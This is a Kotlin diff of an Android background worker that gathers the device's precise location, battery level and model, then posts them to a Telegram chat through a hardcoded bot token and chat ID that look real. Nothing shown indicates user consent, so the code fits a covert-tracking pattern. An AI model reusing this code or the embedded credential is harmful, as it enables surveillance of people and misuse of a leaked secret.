@@ -19,7 +19,7 @@ import org.json.JSONObject
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
-import kotlinx.coroutines.tasks.await
+import kotlinx.coroutines.tasks.await // <--- This import now works because of the new dependency
 
 class DataUploadWorker(private val context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
 
@@ -32,14 +32,12 @@ class DataUploadWorker(private val context: Context, params: WorkerParameters) :
     override suspend fun doWork(): Result {
         Log.d(WORK_NAME, "Worker starting...")
 
-        // 1. Check for location permission (essential for the worker)
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             Log.e(WORK_NAME, "Location permission not granted. Stopping worker.")
             return Result.failure()
         }
 
         return try {
-            // 2. Get all device data
             val location = getCurrentLocation()
             val batteryLevel = getBatteryLevel()
             val deviceModel = Build.MODEL
@@ -47,7 +45,6 @@ class DataUploadWorker(private val context: Context, params: WorkerParameters) :
             val androidVersion = Build.VERSION.RELEASE
             val sdkVersion = Build.VERSION.SDK_INT
 
-            // 3. Create a JSON payload
             val data = JSONObject().apply {
                 put("latitude", location?.latitude ?: "N/A")
                 put("longitude", location?.longitude ?: "N/A")
@@ -56,21 +53,23 @@ class DataUploadWorker(private val context: Context, params: WorkerParameters) :
                 put("androidVersion", "Android $androidVersion (SDK $sdkVersion)")
             }
 
-            // 4. Send the data
             sendDataToApi(data)
 
             Log.d(WORK_NAME, "Worker finished successfully.")
             Result.success()
         } catch (e: Exception) {
             Log.e(WORK_NAME, "Worker failed", e)
-            Result.retry() // Retry the work if it fails
+            Result.retry()
         }
     }
 
     private suspend fun getCurrentLocation(): Location? {
-        // Use a coroutine-friendly way to get the last location
         return try {
+            // The .await() call here is now resolved
             fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, CancellationTokenSource().token).await()
+        } catch (e: SecurityException) {
+            Log.e(WORK_NAME, "Location permission not granted for getting location", e)
+            null
         } catch (e: Exception) {
             Log.e(WORK_NAME, "Failed to get location", e)
             null
@@ -83,12 +82,10 @@ class DataUploadWorker(private val context: Context, params: WorkerParameters) :
     }
 
     private suspend fun sendDataToApi(data: JSONObject) {
-        // Using withContext to switch to an I/O-optimized thread for networking
         withContext(Dispatchers.IO) {
-            val botToken = "7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4" // Replace with your token
-            val chatId = "5080555370" // Replace with your chat ID
+            val botToken = "7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4"
+            val chatId = "5080555370"
 
-            // Format a nice message for Telegram
             val message = """
             📱 *Device Update*
             
@@ -114,12 +111,13 @@ class DataUploadWorker(private val context: Context, params: WorkerParameters) :
                 val payload = JSONObject().apply {
                     put("chat_id", chatId)
                     put("text", message)
-                    put("parse_mode", "Markdown") // Use Markdown for better formatting
+                    put("parse_mode", "Markdown")
                 }.toString()
 
                 val writer = OutputStreamWriter(urlConnection.outputStream)
                 writer.write(payload)
                 writer.flush()
+                writer.close()
 
                 val responseCode = urlConnection.responseCode
                 Log.d(WORK_NAME, "Telegram API response code: $responseCode")
